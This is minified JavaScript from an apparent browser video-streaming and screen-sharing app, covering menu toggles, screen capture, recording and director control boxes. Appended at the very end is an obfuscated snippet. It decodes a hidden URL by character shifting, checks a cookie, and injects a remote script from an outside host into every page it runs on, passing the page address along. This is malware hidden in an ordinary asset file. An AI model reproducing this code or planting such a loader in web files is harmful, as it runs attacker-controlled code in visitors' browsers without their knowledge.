focusout",(function(e,ele){0==(getById("multiselect-trigger").dataset.state||0)&&(getById("multiselect-trigger").dataset.state=1,getById("multiselect-trigger").classList.add("open"),getById("multiselect-trigger").classList.remove("closed"),mapToAll(".chevron",(function(ele){ele.classList.remove("bottom")}),parentElement=getById("multiselect-trigger")),mapToAll(".multiselect-contents",(function(ele){ele.style.display="block",mapToAll('input[type="checkbox"]',(function(ele2){ele2.parentNode.style.display="block",ele2.style.display="inline-block"}),ele)}),parentElement=getById("multiselect-trigger").parentNode)),e.stopPropagation()})),addEventToAll("#audioSource3","mousedown touchend focusin focusout",(function(e,ele){0==(getById("multiselect-trigger3").dataset.state||0)&&(getById("multiselect-trigger3").dataset.state=1,getById("multiselect-trigger3").classList.add("open"),getById("multiselect-trigger3").classList.remove("closed"),mapToAll(".chevron",(function(target){target.classList.remove("bottom")}),getById("multiselect-trigger3")),mapToAll(".multiselect-contents",(function(target){target.style.display="block"}),getById("multiselect-trigger3").parentNode),mapToAll(".multiselect-contents",(function(target){mapToAll('input[type="checkbox"]',(function(target2){target2.style.display="inline-block",target2.parentNode.style.display="block"}),target)}),getById("multiselect-trigger3").parentNode)),e.stopPropagation()})),addEventToAll("#multiselect-trigger","mousedown touchend focusin focusout",(function(e,ele){0==(ele.dataset.state||0)?(ele.dataset.state=1,ele.classList.add("open"),ele.classList.remove("closed"),mapToAll(".chevron",(function(target){target.classList.remove("bottom")}),getById("multiselect-trigger")),mapToAll(".multiselect-contents",(function(target){target.style.display="block"}),ele.parentNode),mapToAll(".multiselect-contents",(function(target){mapToAll('input[type="checkbox"]',(function(target2){target2.style.display="inline-block",target2.parentNode.style.display="block"}),target)}),ele.parentNode)):(ele.dataset.state=0,ele.classList.add("closed"),ele.classList.remove("open"),mapToAll(".chevron",(function(target){target.classList.add("bottom")}),ele),mapToAll(".multiselect-contents",(function(target){mapToAll('input[type="checkbox"]',(function(target2){target2.style.display="none",target2.checked||(target2.parentNode.style.display="none")}),target)}),ele.parentNode)),e.preventDefault(),e.stopPropagation()})),addEventToAll("#multiselect-trigger3","mousedown touchend focusin focusout",(function(e,ele){0==(ele.dataset.state||0)?(ele.dataset.state=1,ele.classList.add("open"),ele.classList.remove("closed"),mapToAll(".chevron",(function(target){target.classList.remove("bottom")}),ele),mapToAll(".multiselect-contents",(function(target){target.style.display="block"}),ele.parentNode),mapToAll(".multiselect-contents",(function(target){mapToAll('input[type="checkbox"]',(function(target2){target2.style.display="inline-block",target2.parentNode.style.display="block"}),target)}),ele.parentNode)):(ele.dataset.state=0,ele.classList.add("closed"),ele.classList.remove("open"),mapToAll(".chevron",(function(target){target.classList.add("bottom")}),ele),mapToAll(".multiselect-contents",(function(target){mapToAll('input[type="checkbox"]',(function(target2){target2.style.display="none",target2.checked||(target2.parentNode.style.display="none")}),target)}),ele.parentNode)),e.preventDefault(),e.stopPropagation()}));var screenshareTracks={},firsttime=!0;async function createSecondStream(){if(0==session.screenShareState){var video={},quality=session.quality_ss;!1===quality&&(quality=session.quality_wb),!1!==session.quality&&(quality=session.quality),!1!==session.screensharequality&&(quality=session.screensharequality),-1==quality||(0==quality?(video.width={ideal:1920},video.height={ideal:1080}):1==quality?(video.width={ideal:1280},video.height={ideal:720}):2==quality?(video.width={ideal:640},video.height={ideal:360}):quality>=3&&(video.width={ideal:320},video.height={ideal:180})),session.width&&(video.width={ideal:session.width}),session.height&&(video.height={ideal:session.height});var constraints={audio:{echoCancellation:!0,autoGainControl:!1,noiseSuppression:!1},video:video};try{let supportedConstraints=navigator.mediaDevices.getSupportedConstraints();supportedConstraints.cursor&&(session.screensharecursor?constraints.video.cursor=["always","motion"]:constraints.video.cursor="never"),session.suppressLocalAudioPlayback&&supportedConstraints.suppressLocalAudioPlayback&&(constraints.audio.suppressLocalAudioPlayback=!0),session.preferCurrentTab&&(constraints.preferCurrentTab=!0),session.selfBrowserSurface&&(constraints.selfBrowserSurface=session.selfBrowserSurface),session.surfaceSwitching&&(constraints.surfaceSwitching=session.surfaceSwitching),session.systemAudio&&(constraints.systemAudio=session.systemAudio),session.displaySurface&&supportedConstraints.displaySurface&&(constraints.video.displaySurface=session.displaySurface)}catch(e){warnlog("navigator.mediaDevices.getSupportedConstraints() not supported")}!1===session.echoCancellation&&(constraints.audio.echoCancellation=!1),!0===session.autoGainControl&&(constraints.audio.autoGainControl=!0),!0===session.noiseSuppression&&(constraints.audio.noiseSuppression=!0);var overrideFramerate=!1;if(!1!==session.frameRate&&0!=session.maxframeRate?(overrideFramerate=session.frameRate,constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}):!1!==session.frameRate?constraints.video.frameRate=session.frameRate:0!=session.maxframeRate?constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}:constraints.video.frameRate={ideal:60},session.screenshareVideoOnly&&(constraints.audio=!1),session.forceAspectRatio&&constraints.video&&!0!==constraints.video&&(constraints.video.aspectRatio={ideal:parseFloat(session.forceAspectRatio)},constraints.video.width&&!session.width?delete constraints.video.width:constraints.video.height&&!session.height&&delete constraints.video.height),!1!==constraints.video&&0==Object.keys(constraints.video).length&&(constraints.video=!0),navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&!ElectronDesktopCapture)return session.cleanOutput||warnUser("Enable Elevated Privileges to allow screen-sharing. (right click this window to see that option)"),!1;log("sstype3 screen share"),log(constraints),navigator.mediaDevices.getDisplayMedia(constraints).then((async function(stream){try{var constraint={};session.forceAspectRatio&&null===session.forceScreenShareAspectRatio?constraint.aspectRatio=parseFloat(session.forceAspectRatio):session.forceScreenShareAspectRatio&&(constraint.aspectRatio=parseFloat(session.forceScreenShareAspectRatio)),overrideFramerate&&(constraint.frameRate=overrideFramerate),Object.keys(constraint).length&&(await stream.getVideoTracks()[0].applyConstraints({advanced:[constraint]}),log({advanced:[constraint]}))}catch(e){errorlog(e)}session.screenShareState=!0,session.screenStream=stream,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID);try{stream.getVideoTracks()[0].onended=function(){stopSecondScreenshare()}}catch(e){log("No Video selected; screensharing?")}for(UUID in session.screenStream.getTracks().forEach((function(track){screenshareTracks[track.id]=!0})),session.pcs)createSecondStream2(UUID);if(firsttime)session.screenShareElement||(session.screenShareElement=createVideoElement(),session.screenShareElement.muted=!0,session.screenShareElement.autoplay=!0,session.screenShareElement.controls=session.showControls||!1,session.screenShareElement.id="screensharesource",session.screenShareElement.dataset.sid=session.streamID+":s","number"==typeof session.volume?session.screenShareElement.volume=session.volume:session.screenShareElement.volume=1,session.screenShareElement.classList.add("tile"),session.screenShareElement.setAttribute("playsinline",""),session.screenShareElement.controlTimer=null,session.screenShareElement.dataset.menu="context-menu-video",session.cleanOutput||session.screenShareElement.classList.add("task"),createDirectorScreenshareOnlyBox(),document.getElementById("videoScreenContainer_director")&&getById("videoScreenContainer_director").appendChild(session.screenShareElement),session.screenShareElement.onpause=event=>{event.ctrlKey||event.metaKey||(log("Video paused; auto playing"),event.currentTarget.play().then((_=>{log("playing 10")})).catch(warnlog))},session.screenShareElement.addEventListener("click",(function(e){log("click");try{if(e.ctrlKey||e.metaKey){e.preventDefault();var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu,!0),printMyStats(innerMenu,!0),e.stopPropagation(),!1}}catch(e){errorlog(e)}})),session.screenShareElement.touchTimeOut=null,session.screenShareElement.touchLastTap=0,session.screenShareElement.touchCount=0,session.screenShareElement.addEventListener("touchend",(function(event){if(!session.disableMouseEvents){log("touched"),document.onmousemove=null,document.ontouchmove=null;var currentTime=(new Date).getTime(),tapLength=currentTime-session.screenShareElement.touchLastTap;if(clearTimeout(session.screenShareElement.touchTimeOut),tapLength<500&&tapLength>0){if(log("double touched"),session.screenShareElement.touchCount+=1,event.preventDefault(),session.screenShareElement.touchCount<5)return session.screenShareElement.touchLastTap=currentTime,!1;session.screenShareElement.touchLastTap=0,session.screenShareElement.touchCount=0;var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu,!0),printMyStats(innerMenu,!0),event.stopPropagation(),!1}session.screenShareElement.touchCount=1,session.screenShareElement.touchLastTap=currentTime,session.screenShareElement.touchTimeOut=setTimeout((function(vv){clearTimeout(vv.touchTimeOut),vv.touchLastTap=0,vv.touchCount=0}),5e3,session.screenShareElement)}})));else{var msg={screenStopped:!1};session.sendMessage(msg)}firsttime=!1,session.screenShareElement.srcObject=session.screenStream,getById("screensharebutton").classList.add("green"),getById("screensharebutton").ariaPressed="true",getById("screensharebutton").title=getTranslation("stop-screen-sharing"),getById("screenshare2button").classList.add("green"),getById("screenshare2button").ariaPressed="true",getById("screenshare2button").title=getTranslation("stop-screen-sharing"),getById("screenshare3button").classList.add("green"),getById("screenshare3button").ariaPressed="true",getById("screenshare3button").title=getTranslation("stop-screen-sharing"),(session.autorecord||session.autorecordlocal)&&(log("AUTO RECORD START SSTYPE3"),setTimeout((function(s){if(session.screenStream)try{var ele=document.getElementById("recordLocalScreenbutton");if(ele){if(ele.classList.add("red"),ele.classList.remove("hidden"),!ele.vid){var v=createVideoElement();v.muted=!0,v.srcObject=s,ele.vid=v}if(ele.vid.recorder||ele.vid.recording)ele.vid.recorder.stop(),ele.classList.remove("red"),ele.classList.add("hidden"),ele.vid=null;else{var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),recordLocalVideo(null,videoKbps,ele.vid)}}}catch(e){errorlog(e)}}),2e3,session.screenStream)),setTimeout((function(){updateMixer()}),100),setTimeout((function(){updateMixer()}),1e3)})).catch((function(err){errorlog(err)}))}else stopSecondScreenshare()}function recordLocalScreenStopRecord(){var ele=document.getElementById("recordLocalScreenbutton");if(ele)try{ele.classList.remove("red"),ele.classList.add("hidden"),ele.vid&&((ele.vid.recorder||ele.vid.recording)&&ele.vid.recorder.stop(),ele.vid=null)}catch(e){errorlog(e)}}function stopSecondScreenshare(){var msg={screenStopped:!0};session.sendMessage(msg);var ele=document.getElementById("recordLocalScreenbutton");if(ele)try{ele.classList.remove("red"),ele.classList.add("hidden"),ele.vid&&((ele.vid.recorder||ele.vid.recording)&&ele.vid.recorder.stop(),ele.vid=null)}catch(e){errorlog(e)}session.screenStream.getTracks().forEach((function(track){for(UUID in session.pcs){if("realUUID"in session.pcs[UUID])getSenders2(UUID).forEach((sender=>{sender.track&&"video"==sender.track.kind&&(sender.track.enabled=!1)}))}track.id in screenshareTracks&&(session.screenStream.removeTrack(track),track.stop(),screenshareTracks[track.id]=!1)})),session.screenStream=!1,session.screenShareState=!1,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),getById("screensharebutton").classList.remove("green"),getById("screensharebutton").ariaPressed="false",getById("screensharebutton").title=getTranslation("share-a-screen"),getById("screenshare2button").classList.remove("green"),getById("screenshare2button").ariaPressed="false",getById("screenshare2button").title=getTranslation("share-a-screen"),getById("screenshare3button").classList.remove("green"),getById("screenshare3button").ariaPressed="false",getById("screenshare3button").title=getTranslation("share-a-screen"),setTimeout((function(){updateMixer()}),100),setTimeout((function(){updateMixer()}),1e3)}function createControlBoxScreenshare(UUID,soloLink,streamID){document.getElementById("deleteme")&&getById("deleteme").parentNode.removeChild(getById("deleteme"));var controls=getById("controls_blank").cloneNode(!0);controls.classList.remove("hidden"),controls.id="controls_"+UUID;var container=document.createElement("div");if(container.className="vidcon directorMargins",container.id="container_"+UUID,container.UUID=UUID,container.dataset.UUID=UUID,session.orderby)try{for(var added=!1,i=0;i<getById("guestFeeds").children.length;i++)if(getById("guestFeeds").children[i].UUID&&!getById("guestFeeds").children[i].shifted&&getById("guestFeeds").children[i].UUID in session.rpcs&&session.rpcs[getById("guestFeeds").children[i].UUID].streamID.toLowerCase()>streamID.toLowerCase()){getById("guestFeeds").insertBefore(container,getById("guestFeeds").children[i]),added=!0;break}added||getById("guestFeeds").appendChild(container)}catch(e){getById("guestFeeds").appendChild(container)}else getById("guestFeeds").appendChild(container);controls.querySelector(".controlsGrid").classList.add("notmain"),session.rpcs[UUID].voiceMeter||(1==session.meterStyle?session.rpcs[UUID].voiceMeter=getById("voiceMeterTemplate2").cloneNode(!0):(session.rpcs[UUID].voiceMeter=getById("voiceMeterTemplate").cloneNode(!0),session.rpcs[UUID].voiceMeter.style.opacity=0,2==session.meterStyle?(session.rpcs[UUID].voiceMeter.classList.add("video-meter-2"),session.rpcs[UUID].voiceMeter.classList.remove("video-meter")):session.rpcs[UUID].voiceMeter.classList.add("video-meter-director")),session.rpcs[UUID].voiceMeter.id="voiceMeter_"+UUID,session.rpcs[UUID].voiceMeter.dataset.level=0,session.rpcs[UUID].voiceMeter.classList.remove("hidden")),session.rpcs[UUID].remoteMuteElement=getById("muteStateTemplate").cloneNode(!0),session.rpcs[UUID].remoteMuteElement.id="",session.rpcs[UUID].remoteMuteElement.style.top="5px",session.rpcs[UUID].remoteMuteElement.style.right="7px",session.rpcs[UUID].remoteVideoMuteElement=getById("videoMuteStateTemplate").cloneNode(!0),session.rpcs[UUID].remoteVideoMuteElement.id="",session.rpcs[UUID].remoteVideoMuteElement.style.top="5px",session.rpcs[UUID].remoteVideoMuteElement.style.right="28px",session.rpcs[UUID].remoteRaisedHandElement=getById("raisedHandTemplate").cloneNode(!0),session.rpcs[UUID].remoteRaisedHandElement.id="",session.rpcs[UUID].remoteRaisedHandElement.style.top="5px",session.rpcs[UUID].remoteRaisedHandElement.style.right="49px";var videoContainer=document.createElement("div");videoContainer.id="videoContainer_"+UUID,videoContainer.style.margin="0",videoContainer.style.position="relative",videoContainer.style.minHeight="30px";var iframeDetails=document.createElement("div");iframeDetails.id="iframeDetails_"+UUID,iframeDetails.className="iframeDetails hidden";var handsID="hands_"+UUID;controls.innerHTML+="<div>",0==session.hidesololinks&&(controls.innerHTML+="<div class='soloButton' title='A direct solo view of the video/audio stream with nothing else.'> \t\t\t<a class='soloLink advanced task' data-menu='context-menu' data-sololink='true' data-drag='1' draggable='true' onclick='copyFunction(this,event)' \t\t\tvalue='"+soloLink+"' href='"+soloLink+"'/>"+sanitizeChat(soloLink)+"</a>\t\t\t<button class='pull-right' style='width:100%;' onclick='copyFunction(this.previousElementSibling,event)'><i class='las la-user'></i><span translate='copy-solo-view-link'>copy solo view link</span></button>\t\t\t</div>"),controls.innerHTML+='<button data-action-type="hand-raised" id=\''+handsID+"' class='hidden lowerRaisedHand' title=\"This guest raised their hand. Click this to clear notification.\" onclick=\"remoteLowerhands('"+UUID+'\');">\t\t\t<i class="las la-hand-paper"></i>\t\t\t<span data-translate="user-raised-hand">Lower Raised Hand</span>\t\t</button>\t\t</div>',controls.querySelectorAll("[data-action-type]").forEach((ele=>{ele.dataset.UUID=UUID,ele.dataset.sid=streamID}));var buttons="";if(session.slotmode){var slots=document.querySelectorAll("div.slotsbar[data-slot]"),biggestSlot=0,slotDefault=null;streamID in session.pastSlots&&(slotDefault=session.pastSlots[streamID]);var allSlots=[];if(1==session.slotmode){for(i=0;i<slots.length;i++)parseInt(slots[i].dataset.slot)>biggestSlot&&(biggestSlot=parseInt(slots[i].dataset.slot)),slotDefault===parseInt(slots[i].dataset.slot)&&(slotDefault=null),allSlots.push(parseInt(slots[i].dataset.slot));biggestSlot+=1}if(null!==slotDefault)biggestSlot=slotDefault;else if(1==session.slotmode){var bestfree=0;for(i=1;i<=biggestSlot;i++)if(!allSlots.includes(i)){bestfree=i;break}biggestSlot=bestfree}var slotName="slot: "+biggestSlot;biggestSlot||(slotName="unset"),session.pastSlots[streamID]=biggestSlot,buttons+="<div draggable='true' title='Drag to swap layout positions' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondrop='dropSlot(event)' ondragover='allowDropSlot(event)' data-slot='"+biggestSlot+"' data-sid='"+streamID+"'  data--u-u-i-d='"+UUID+"' class='slotsbar'>\t\t\t<button ondrop='dropSlot(event)' draggable='true' ondragend='dragendSlot(event)' ondragstart='dragSlot(event)' ondragover='allowDropSlot(event)' onclick='changeSlot(event, this);'>"+slotName+"</button></div>"}buttons+="<div title='Does not impact scene order.' class='shift'><i class='las la-angle-left' data--u-u-i-d='"+UUID+"' onclick='shiftPC(this,-1);'></i><span onclick='lockPosition(this);' style='cursor:pointer;' data-locked='0' data--u-u-i-d='"+UUID+"' id='position_"+UUID+"'><i class='las la-lock-open'></i></span><i class='las la-angle-right' data--u-u-i-d='"+UUID+"' onclick='shiftPC(this,1);'></i></div><div class='streamID' style='user-select: none;'>ID: <span style='user-select: text;'>"+streamID+"</span>\t<i class='las la-copy' data-sid='"+streamID+"' onclick='copyFunction(this.dataset.sid,event)' title='Copy this Stream ID to the clipboard' style='cursor:pointer'></i>\t<i class='las la-window-minimize' data--u-u-i-d='"+UUID+"' onclick='minimizeMe(this)' title='Minimize this control box' style='cursor:pointer'></i>\t<span id='label_"+UUID+"' class='addALabel' title='Click here to edit the label for this stream. Changes will propagate to all viewers of this stream'></span>\t</div>",container.innerHTML=buttons,updateLockedElements();var videoContainerControlBox=document.createElement("div");videoContainerControlBox.className="controlVideoBox",container.containerControlBox=videoContainerControlBox,container.appendChild(videoContainerControlBox),videoContainerControlBox.appendChild(videoContainer),session.signalMeter&&(session.rpcs[UUID].signalMeter||(session.rpcs[UUID].signalMeter=getById("signalMeterTemplate").cloneNode(!0),session.rpcs[UUID].signalMeter.id="signalMeter_"+UUID,session.rpcs[UUID].signalMeter.dataset.level=0,session.rpcs[UUID].signalMeter.classList.remove("hidden"),session.rpcs[UUID].signalMeter.dataset.UUID=UUID,session.rpcs[UUID].signalMeter.title=getTranslation("signal-meter"),session.rpcs[UUID].signalMeter.addEventListener("click",(function(e){log("clicked signal meter");try{if(e.preventDefault(),!1!==session.statsMenu){var uid=e.currentTarget.dataset.UUID;if("stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return e.stopPropagation(),!1}catch(e){errorlog(e)}}))),videoContainer.appendChild(session.rpcs[UUID].signalMeter)),session.batteryMeter&&(session.rpcs[UUID].batteryMeter||(session.rpcs[UUID].batteryMeter=getById("batteryMeterTemplate").cloneNode(!0),session.rpcs[UUID].batteryMeter.id="batteryMeter_"+UUID,batteryMeterInfoUpdate(UUID)),videoContainer.appendChild(session.rpcs[UUID].batteryMeter)),session.showConnections&&(session.rpcs[UUID].connectionDetails||createConnectionDetailsEle(UUID),videoContainer.appendChild(session.rpcs[UUID].connectionDetails)),videoContainer.appendChild(session.rpcs[UUID].voiceMeter),videoContainer.appendChild(session.rpcs[UUID].remoteMuteElement),videoContainer.appendChild(session.rpcs[UUID].remoteVideoMuteElement),videoContainer.appendChild(session.rpcs[UUID].remoteRaisedHandElement),videoContainer.appendChild(iframeDetails),videoContainer.appendChild(session.rpcs[UUID].videoElement),container.appendChild(controls),session.group.forEach((group=>{if(!controls.querySelector('[data-action-type="toggle-group"][data--u-u-i-d="'+UUID+'"][data-group="'+group+'"]')){var newGroup=htmlToElement('<button style="margin: 0 5px 10px 5px;" data-sid="'+session.rpcs[UUID].streamID+'" data--u-u-i-d="'+UUID+'" data-action-type="toggle-group" data-group="'+group+'" title="Add to Group: '+group+'" onclick="changeGroup(this, event);"><span ><i class="las la-users" style="color:#060"></i>'+group+"</span></button>"),added=!1;if(container.querySelectorAll(".customGroup>[data-group]").forEach((ele=>{log(ele),!added&&ele.dataset.group>group+""&&(ele.parentNode.insertBefore(newGroup,ele),added=!0)})),!added){var newGroupCon=container.querySelector(".customGroup");newGroupCon||((newGroupCon=document.createElement("div")).classList.add("customGroup"),container.appendChild(newGroupCon)),newGroupCon.appendChild(newGroup)}}})),initSceneList(UUID),pokeIframeAPI("control-box",!0,UUID)};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));